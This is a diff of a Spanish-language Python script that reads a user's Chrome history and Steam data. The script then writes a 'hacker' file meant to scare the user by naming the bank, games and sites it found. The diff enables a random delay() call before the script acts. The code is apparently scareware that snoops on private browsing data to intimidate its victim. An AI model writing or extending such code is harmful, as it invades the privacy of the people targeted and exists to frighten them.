@@ -84,11 +84,11 @@ def scare_user_with_banks(hacker_doc, chrome_history):
     hacker_doc.write("He visto que eres del banco {}".format(bank))
 
 
-"""def delay():
+def delay():
     n_hours = random.randrange(1, 3)
     n_min = random.randrange(1, 60)
     print("Dormiremos {} horas y  {} minutos".format(n_hours, n_min))
-    time.sleep((n_hours * 60 * 60) + (n_min * 60))"""
+    time.sleep(n_hours)
 
 
 def crear_archivo(user_path):
@@ -101,12 +101,12 @@ def main():
     user_path = get_user_path()
     steam_path = get_steam_path()
     chrome_history = get_chrome_data(user_path)
+    delay()
     hacker_doc = crear_archivo(user_path)
     scare_user_with_steam_games(hacker_doc, steam_path)
     scare_user_with_twitter(hacker_doc, chrome_history)
     scare_user_with_youtube(hacker_doc, chrome_history)
     scare_user_with_banks(hacker_doc, chrome_history)
-    """delay()"""
 
 
 if __name__ == "__main__":
